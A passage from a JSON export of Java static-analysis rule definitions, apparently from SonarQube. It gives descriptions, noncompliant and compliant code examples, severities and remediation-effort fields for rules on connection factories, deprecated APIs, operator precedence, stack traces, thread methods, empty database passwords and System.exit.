id=\"singleCF\" class=\"org.springframework.jms.connection.SingleConnectionFactory\" p:reconnectOnException=\"true\"&gt;\n   &lt;constructor-arg ref=\"dummyConnectionFactory\" /&gt;\n &lt;/bean&gt;\n</pre>\n<p>or</p>\n<pre>\n &lt;bean id=\"singleCF\" class=\"org.springframework.jms.connection.SingleConnectionFactory\"&gt;\n   &lt;constructor-arg ref=\"dummyConnectionFactory\" /&gt;\n   &lt;property name=\"reconnectOnException\"&gt;&lt;value&gt;true&lt;/value&gt;&lt;/property&gt;\n &lt;/bean&gt;\n</pre>",
            "mdDesc": "<p>Use of a Spring <code>SingleConnectionFactory</code> without enabling the <code>reconnectOnException</code> setting will prevent automatic\nconnection recovery when the connection goes bad. </p>\n<p>That's because the <code>reconnectOnException</code> property defaults to <code>false</code>. As a result, even if the code that uses this\nconnection factory (Spring's <code>DefaultMessageListenerContainer</code> or your own code) has reconnect logic, that code won't work because the\n<code>SingleConnectionFactory</code> will act like a single-connection pool by preventing connection <code>close</code> calls from actually closing\nanything. As a result, subsequent factory <code>create</code> operations will just hand back the original broken <code>Connection</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n &lt;bean id=\"singleCF\" class=\"org.springframework.jms.connection.SingleConnectionFactory\"&gt;  &lt;!-- Noncompliant --&gt;\n   &lt;constructor-arg ref=\"dummyConnectionFactory\" /&gt;\n &lt;/bean&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n &lt;bean id=\"singleCF\" class=\"org.springframework.jms.connection.SingleConnectionFactory\" p:reconnectOnException=\"true\"&gt;\n   &lt;constructor-arg ref=\"dummyConnectionFactory\" /&gt;\n &lt;/bean&gt;\n</pre>\n<p>or</p>\n<pre>\n &lt;bean id=\"singleCF\" class=\"org.springframework.jms.connection.SingleConnectionFactory\"&gt;\n   &lt;constructor-arg ref=\"dummyConnectionFactory\" /&gt;\n   &lt;property name=\"reconnectOnException\"&gt;&lt;value&gt;true&lt;/value&gt;&lt;/property&gt;\n &lt;/bean&gt;\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S5738",
            "repo": "java",
            "name": "\"@Deprecated\" code marked for removal should never be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Java 9 introduced a flag for the <code>@Deprecated</code> annotation, which allows to explicitly say if the deprecated code is planned to be\nremoved at some point or not. This is done using <code>forRemoval=true</code> as annotation parameter. The javadoc of the annotation explicitly\nmention the following: </p>\n<blockquote>\n  <p>If true, it means that this API element is earmarked for removal in a future release.</p>\n  <p>If false, the API element is deprecated, but there is currently no intention to remove it in a future release.</p>\n</blockquote>\n<p>While usually deprecated classes, interfaces, and their deprecated members should be avoided rather than used, inherited or extended, those already\nmarked for removal are much more sensitive to causing trouble in your code soon. Consequently, any usage of such deprecated code should be avoided or\nremoved.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n/**\n * @deprecated As of release 1.3, replaced by {@link #Fee}. Will be dropped with release 1.4.\n */\n@Deprecated(forRemoval=true)\npublic class Foo { ... }\n\npublic class Bar {\n  /**\n   * @deprecated  As of release 1.7, replaced by {@link #doTheThingBetter()}\n   */\n  @Deprecated(forRemoval=true)\n  public void doTheThing() { ... }\n\n  public void doTheThingBetter() { ... }\n\n  /**\n   * @deprecated As of release 1.14 due to poor performances.\n   */\n  @Deprecated(forRemoval=false)\n  public void doTheOtherThing() { ... }\n}\n\npublic class Qix extends Bar {\n  @Override\n  public void doTheThing() { ... } // Noncompliant; don't override a deprecated method marked for removal\n}\n\npublic class Bar extends Foo {  // Noncompliant; Foo is deprecated and will be removed\n\n  public void myMethod() {\n    Bar bar = new Bar();  // okay; the class isn't deprecated\n    bar.doTheThing();  // Noncompliant; doTheThing method is deprecated and will be removed\n\n    bar.doTheOtherThing(); // Okay; deprecated, but not marked for removal\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/477.html\">MITRE, CWE-477</a> - Use of Obsolete Functions </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/6TdGBQ\">CERT, MET02-J.</a> - Do not use deprecated or obsolete classes or methods </li>\n  <li> RSPEC-1874 for standard deprecation use </li>\n</ul>",
            "mdDesc": "<p>Java 9 introduced a flag for the <code>@Deprecated</code> annotation, which allows to explicitly say if the deprecated code is planned to be\nremoved at some point or not. This is done using <code>forRemoval=true</code> as annotation parameter. The javadoc of the annotation explicitly\nmention the following: </p>\n<blockquote>\n  <p>If true, it means that this API element is earmarked for removal in a future release.</p>\n  <p>If false, the API element is deprecated, but there is currently no intention to remove it in a future release.</p>\n</blockquote>\n<p>While usually deprecated classes, interfaces, and their deprecated members should be avoided rather than used, inherited or extended, those already\nmarked for removal are much more sensitive to causing trouble in your code soon. Consequently, any usage of such deprecated code should be avoided or\nremoved.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n/**\n * @deprecated As of release 1.3, replaced by {@link #Fee}. Will be dropped with release 1.4.\n */\n@Deprecated(forRemoval=true)\npublic class Foo { ... }\n\npublic class Bar {\n  /**\n   * @deprecated  As of release 1.7, replaced by {@link #doTheThingBetter()}\n   */\n  @Deprecated(forRemoval=true)\n  public void doTheThing() { ... }\n\n  public void doTheThingBetter() { ... }\n\n  /**\n   * @deprecated As of release 1.14 due to poor performances.\n   */\n  @Deprecated(forRemoval=false)\n  public void doTheOtherThing() { ... }\n}\n\npublic class Qix extends Bar {\n  @Override\n  public void doTheThing() { ... } // Noncompliant; don't override a deprecated method marked for removal\n}\n\npublic class Bar extends Foo {  // Noncompliant; Foo is deprecated and will be removed\n\n  public void myMethod() {\n    Bar bar = new Bar();  // okay; the class isn't deprecated\n    bar.doTheThing();  // Noncompliant; doTheThing method is deprecated and will be removed\n\n    bar.doTheOtherThing(); // Okay; deprecated, but not marked for removal\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/477.html\">MITRE, CWE-477</a> - Use of Obsolete Functions </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/6TdGBQ\">CERT, MET02-J.</a> - Do not use deprecated or obsolete classes or methods </li>\n  <li> RSPEC-1874 for standard deprecation use </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "obsolete"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S864",
            "repo": "java",
            "name": "Limited dependence should be placed on operator precedence",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The rules of operator precedence are complicated and can lead to errors. For this reason, parentheses should be used for clarification in complex\nstatements. However, this does not mean that parentheses should be gratuitously added around every operation. </p>\n<p>This rule raises issues when <code>&amp;&amp;</code> and <code>||</code> are used in combination, when assignment and equality or relational\noperators are used in together in a condition, and for other operator combinations according to the following table:</p>\n<table>\n  <tbody>\n    <tr>\n      <td> </td>\n      <td><code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code></td>\n      <td><code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>&gt;&gt;&gt;</code></td>\n      <td><code>&amp;</code></td>\n      <td><code>^</code></td>\n      <td> <code>|</code> </td>\n    </tr>\n    <tr>\n      <td><code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code></td>\n      <td> </td>\n      <td>x</td>\n      <td>x</td>\n      <td>x</td>\n      <td>x</td>\n    </tr>\n    <tr>\n      <td><code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>&gt;&gt;&gt;</code></td>\n      <td>x</td>\n      <td> </td>\n      <td>x</td>\n      <td>x</td>\n      <td>x</td>\n    </tr>\n    <tr>\n      <td><code>&amp;</code></td>\n      <td>x</td>\n      <td>x</td>\n      <td> </td>\n      <td>x</td>\n      <td>x</td>\n    </tr>\n    <tr>\n      <td><code>^</code></td>\n      <td>x</td>\n      <td>x</td>\n      <td>x</td>\n      <td> </td>\n      <td>x</td>\n    </tr>\n    <tr>\n      <td> <code>|</code> </td>\n      <td>x</td>\n      <td>x</td>\n      <td>x</td>\n      <td>x</td>\n      <td> </td>\n    </tr>\n  </tbody>\n</table>\n<p>This rule also raises an issue when the \"true\" or \"false\" expression of a ternary operator is not trivial and not wrapped inside parentheses.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nx = a + b - c;\nx = a + 1 &lt;&lt; b;  // Noncompliant\ny = a == b ? a * 2 : a + b;  // Noncompliant\n\nif ( a &gt; b || c &lt; d || a == d) {...}\nif ( a &gt; b &amp;&amp; c &lt; d || a == b) {...}  // Noncompliant\nif (a = f(b,c) == 1) { ... } // Noncompliant; == evaluated first\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nx = a + b - c;\nx = (a + 1) &lt;&lt; b;\ny = a == b ? (a * 2) : (a + b);\n\nif ( a &gt; b || c &lt; d || a == d) {...}\nif ( (a &gt; b &amp;&amp; c &lt; d) || a == b) {...}\nif ( (a = f(b,c)) == 1) { ... }\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/YdYxBQ\">CERT, EXP00-C.</a> - Use parentheses for precedence of operation </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ZzZGBQ\">CERT, EXP53-J.</a> - Use parentheses for precedence of operation </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/783.html\">MITRE, CWE-783</a> - Operator Precedence Logic Error </li>\n</ul>",
            "mdDesc": "<p>The rules of operator precedence are complicated and can lead to errors. For this reason, parentheses should be used for clarification in complex\nstatements. However, this does not mean that parentheses should be gratuitously added around every operation. </p>\n<p>This rule raises issues when <code>&amp;&amp;</code> and <code>||</code> are used in combination, when assignment and equality or relational\noperators are used in together in a condition, and for other operator combinations according to the following table:</p>\n<table>\n  <tbody>\n    <tr>\n      <td> </td>\n      <td><code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code></td>\n      <td><code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>&gt;&gt;&gt;</code></td>\n      <td><code>&amp;</code></td>\n      <td><code>^</code></td>\n      <td> <code>|</code> </td>\n    </tr>\n    <tr>\n      <td><code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code></td>\n      <td> </td>\n      <td>x</td>\n      <td>x</td>\n      <td>x</td>\n      <td>x</td>\n    </tr>\n    <tr>\n      <td><code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>&gt;&gt;&gt;</code></td>\n      <td>x</td>\n      <td> </td>\n      <td>x</td>\n      <td>x</td>\n      <td>x</td>\n    </tr>\n    <tr>\n      <td><code>&amp;</code></td>\n      <td>x</td>\n      <td>x</td>\n      <td> </td>\n      <td>x</td>\n      <td>x</td>\n    </tr>\n    <tr>\n      <td><code>^</code></td>\n      <td>x</td>\n      <td>x</td>\n      <td>x</td>\n      <td> </td>\n      <td>x</td>\n    </tr>\n    <tr>\n      <td> <code>|</code> </td>\n      <td>x</td>\n      <td>x</td>\n      <td>x</td>\n      <td>x</td>\n      <td> </td>\n    </tr>\n  </tbody>\n</table>\n<p>This rule also raises an issue when the \"true\" or \"false\" expression of a ternary operator is not trivial and not wrapped inside parentheses.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nx = a + b - c;\nx = a + 1 &lt;&lt; b;  // Noncompliant\ny = a == b ? a * 2 : a + b;  // Noncompliant\n\nif ( a &gt; b || c &lt; d || a == d) {...}\nif ( a &gt; b &amp;&amp; c &lt; d || a == b) {...}  // Noncompliant\nif (a = f(b,c) == 1) { ... } // Noncompliant; == evaluated first\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nx = a + b - c;\nx = (a + 1) &lt;&lt; b;\ny = a == b ? (a * 2) : (a + b);\n\nif ( a &gt; b || c &lt; d || a == d) {...}\nif ( (a &gt; b &amp;&amp; c &lt; d) || a == b) {...}\nif ( (a = f(b,c)) == 1) { ... }\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/YdYxBQ\">CERT, EXP00-C.</a> - Use parentheses for precedence of operation </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ZzZGBQ\">CERT, EXP53-J.</a> - Use parentheses for precedence of operation </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/783.html\">MITRE, CWE-783</a> - Operator Precedence Logic Error </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1148",
            "repo": "java",
            "name": "Throwable.printStackTrace(...) should not be called",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>Throwable.printStackTrace(...)</code> prints a <code>Throwable</code> and its stack trace to some stream. By default that stream\n<code>System.Err</code>, which could inadvertently expose sensitive information.</p>\n<p>Loggers should be used instead to print <code>Throwable</code>s, as they have many advantages:</p>\n<ul>\n  <li> Users are able to easily retrieve the logs. </li>\n  <li> The format of log messages is uniform and allow users to browse the logs easily. </li>\n</ul>\n<p>This rule raises an issue when <code>printStackTrace</code> is used without arguments, i.e. when the stack trace is printed to the default\nstream.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ntry {\n  /* ... */\n} catch(Exception e) {\n  e.printStackTrace();        // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ntry {\n  /* ... */\n} catch(Exception e) {\n  LOGGER.log(\"context\", e);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/489.html\">MITRE, CWE-489</a> - Leftover Debug Code </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use <a href='/coding_rules#rule_key=java%3AS4507'>S4507</a> instead.</p>",
            "mdDesc": "<p><code>Throwable.printStackTrace(...)</code> prints a <code>Throwable</code> and its stack trace to some stream. By default that stream\n<code>System.Err</code>, which could inadvertently expose sensitive information.</p>\n<p>Loggers should be used instead to print <code>Throwable</code>s, as they have many advantages:</p>\n<ul>\n  <li> Users are able to easily retrieve the logs. </li>\n  <li> The format of log messages is uniform and allow users to browse the logs easily. </li>\n</ul>\n<p>This rule raises an issue when <code>printStackTrace</code> is used without arguments, i.e. when the stack trace is printed to the default\nstream.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ntry {\n  /* ... */\n} catch(Exception e) {\n  e.printStackTrace();        // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ntry {\n  /* ... */\n} catch(Exception e) {\n  LOGGER.log(\"context\", e);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/489.html\">MITRE, CWE-489</a> - Leftover Debug Code </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use {rule:java:S4507} instead.</p>",
            "severity": "MINOR",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S2236",
            "repo": "java",
            "name": "Methods \"wait(...)\", \"notify()\" and \"notifyAll()\" should not be called on Thread instances",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The methods <code>wait(...)</code>, <code>notify()</code> and <code>notifyAll()</code> are available on a <code>Thread</code> instance, but only\nbecause all classes in Java extend <code>Object</code> and therefore automatically inherit those methods. But there are two very good reasons for not\ncalling them on a <code>Thread</code>:</p>\n<ul>\n  <li> Internally, the JVM relies on these methods to change the state of the Thread (<code>BLOCKED</code>, <code>WAITING</code>, ...), so calling\n  them will corrupt the behavior of the JVM. </li>\n  <li> It is not clear (perhaps even to the original coder) what is really expected. For instance, it is waiting for the execution of the Thread to\n  suspended, or is it the acquisition of the object monitor that is waited for? </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nThread myThread = new Thread(new RunnableJob());\n...\nmyThread.wait(2000);\n</pre>",
            "mdDesc": "<p>The methods <code>wait(...)</code>, <code>notify()</code> and <code>notifyAll()</code> are available on a <code>Thread</code> instance, but only\nbecause all classes in Java extend <code>Object</code> and therefore automatically inherit those methods. But there are two very good reasons for not\ncalling them on a <code>Thread</code>:</p>\n<ul>\n  <li> Internally, the JVM relies on these methods to change the state of the Thread (<code>BLOCKED</code>, <code>WAITING</code>, ...), so calling\n  them will corrupt the behavior of the JVM. </li>\n  <li> It is not clear (perhaps even to the original coder) what is really expected. For instance, it is waiting for the execution of the Thread to\n  suspended, or is it the acquisition of the object monitor that is waited for? </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nThread myThread = new Thread(new RunnableJob());\n...\nmyThread.wait(2000);\n</pre>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "multi-threading"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2115",
            "repo": "java",
            "name": "Databases should be password-protected",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Databases should always be password protected. The use of a database connection with an empty password is a clear indication of a database that is\nnot protected.</p>\n<p>This rule flags database connections with empty passwords.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nConnection conn = DriverManager.getConnection(\"jdbc:derby:memory:myDB;create=true\", \"AppLogin\", \"\");\nConnection conn2 = DriverManager.getConnection(\"jdbc:derby:memory:myDB;create=true?user=user&amp;password=\");\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nDriverManager.getConnection(\"jdbc:derby:memory:myDB;create=true?user=user&amp;password=password\");\n\nDriverManager.getConnection(\"jdbc:mysql://address=(host=myhost1)(port=1111)(key1=value1)(user=sandy)(password=secret),address=(host=myhost2)(port=2222)(key2=value2)(user=sandy)(password=secret)/db\");\n\nDriverManager.getConnection(\"jdbc:mysql://sandy:secret@[myhost1:1111,myhost2:2222]/db\");\n\nString url = \"jdbc:postgresql://localhost/test\";\nProperties props = new Properties();\nprops.setProperty(\"user\", \"fred\");\nprops.setProperty(\"password\", \"secret\");\nDriverManager.getConnection(url, props);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/521.html\">MITRE, CWE-521</a> - Weak Password Requirements </li>\n</ul>",
            "mdDesc": "<p>Databases should always be password protected. The use of a database connection with an empty password is a clear indication of a database that is\nnot protected.</p>\n<p>This rule flags database connections with empty passwords.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nConnection conn = DriverManager.getConnection(\"jdbc:derby:memory:myDB;create=true\", \"AppLogin\", \"\");\nConnection conn2 = DriverManager.getConnection(\"jdbc:derby:memory:myDB;create=true?user=user&amp;password=\");\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nDriverManager.getConnection(\"jdbc:derby:memory:myDB;create=true?user=user&amp;password=password\");\n\nDriverManager.getConnection(\"jdbc:mysql://address=(host=myhost1)(port=1111)(key1=value1)(user=sandy)(password=secret),address=(host=myhost2)(port=2222)(key2=value2)(user=sandy)(password=secret)/db\");\n\nDriverManager.getConnection(\"jdbc:mysql://sandy:secret@[myhost1:1111,myhost2:2222]/db\");\n\nString url = \"jdbc:postgresql://localhost/test\";\nProperties props = new Properties();\nprops.setProperty(\"user\", \"fred\");\nprops.setProperty(\"password\", \"secret\");\nDriverManager.getConnection(url, props);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/521.html\">MITRE, CWE-521</a> - Weak Password Requirements </li>\n</ul>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a3"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "45min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "45min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "45min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "45min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S3688",
            "repo": "java",
            "name": "Track uses of disallowed classes",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>This rule allows banning certain classes.</p>\n<h2>Noncompliant Code Example</h2>\n<p>Given parameters:</p>\n<ul>\n  <li> className:java.lang.String </li>\n</ul>\n<pre>\nString name;  // Noncompliant\n</pre>",
            "mdDesc": "<p>This rule allows banning certain classes.</p>\n<h2>Noncompliant Code Example</h2>\n<p>Given parameters:</p>\n<ul>\n  <li> className:java.lang.String </li>\n</ul>\n<pre>\nString name;  // Noncompliant\n</pre>",
            "severity": "INFO",
            "status": "READY",
            "isTemplate": true,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "className",
                    "htmlDesc": "Fully qualified name of the forbidden class. Use a regex to forbid a package.",
                    "type": "STRING"
                }
            ],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1147",
            "repo": "java",
            "name": "Exit methods should not be called",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Calling <code>System.exit(int status)</code> or <code>Rutime.getRuntime().exit(int status)</code> calls the shutdown hooks and shuts downs the\nentire Java virtual machine. Calling <code>Runtime.getRuntime().halt(int)</code> does an immediate shutdown, without calling the shutdown hooks, and\nskipping finalization.</p>\n<p>Each of these methods should be used with extreme care, and only when the intent is to stop the whole Java process. For instance, none of them\nshould be called from applications running in a J2EE container.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nSystem.exit(0);\nRuntime.getRuntime().exit(0);\nRuntime.getRuntime().halt(0);\n</pre>\n<h2>Exceptions</h2>\n<p>These methods are ignored inside <code>main</code>.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/382.html\">MITRE, CWE-382</a> - Use of System.exit() </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/7zZGBQ\">CERT, ERR09-J.</a> - Do not allow untrusted code to terminate the JVM </li>\n</ul>",
            "mdDesc": "<p>Calling <code>System.exit(int status)</code> or <code>Rutime.getRuntime().exit(int status)</code> calls the shutdown hooks and shuts downs the\nentire Java virtual machine. Calling <code>Runtime.getRuntime().halt(int)</code> does an immediate shutdown, without calling the shutdown hooks, and\nskipping finalization.</p>\n<p>Each of these methods should be used with extreme care, and only when the intent is to stop the whole Java process. For instance, none of them\nshould be called from applications running in a J2EE container.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nSystem.exit(0);\nRuntime.getRuntime().exit(0);\nRuntime.getRuntime().halt(0);\n</pre>\n<h2>Exceptions</h2>\n<p>These methods are ignored inside <code>main</code>.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/382.html\">MITRE, CWE-382</a> - Use of System.exit() </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/7zZGBQ\">CERT, ERR09-J.</a> - Do not allow untrusted code to terminate the JVM </li>\n</ul>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2479",
            "repo": "java",
            "name": "Whitespace and control characters in literals should be explicit",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc":"<p>Non-encoded control characters and whitespace characters are often injected in the source code because of a bad manipulation. They are either\ninvisible or difficult to recognize, which can result in bugs when the string is not what the developer expects. If you actually need to use a control\ncharacter use their encoded version (ex: ASCII <code>\\n,\\t,</code>... or Unicode <code>U+000D, U+0009,</code>...).</p>\n<p>This rule raises an issue when the following characters are seen in a literal string:</p>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/ASCII#Control_characters\">ASCII control character</a>. (character index &lt; 32 or = 127) </li>\n  <li> Unicode <a href=\"https://en.wikipedia.org/wiki/Unicode_character_property#Whitespace\">whitespace characters</a>. </li>\n  <li> Unicode <a href=\"https://en.wikipedia.org/wiki/C0_and_C1_control_codes\">C0 control characters</a> </li>\n  <li> Unicode characters <code>U+200B, U+200C, U+200D, U+2060, U+FEFF, U+2028, U+2029</code> </li>\n</ul>\n<p>No issue will be raised on the simple space character. Unicode <code>U+0020</code>, ASCII 32.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString tabInside = \"A\tB\";  // Noncompliant, contains a tabulation\nString zeroWidthSpaceInside = \"foo​bar\"; // Noncompliant, it contains a U+200B character inside\nchar tab = '\t';\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString tabInside = \"A\\tB\";  // Compliant, uses escaped value\nString zeroWidthSpaceInside = \"foo\​bar\";  // Compliant, uses escaped value\nchar tab = '\\t';\n</pre>\n<h2>Exceptions</h2>\n<p>Text Blocks string literals (java 13 three double-quote marks) can contain tabulations to allow indentation using tabulations.</p>",
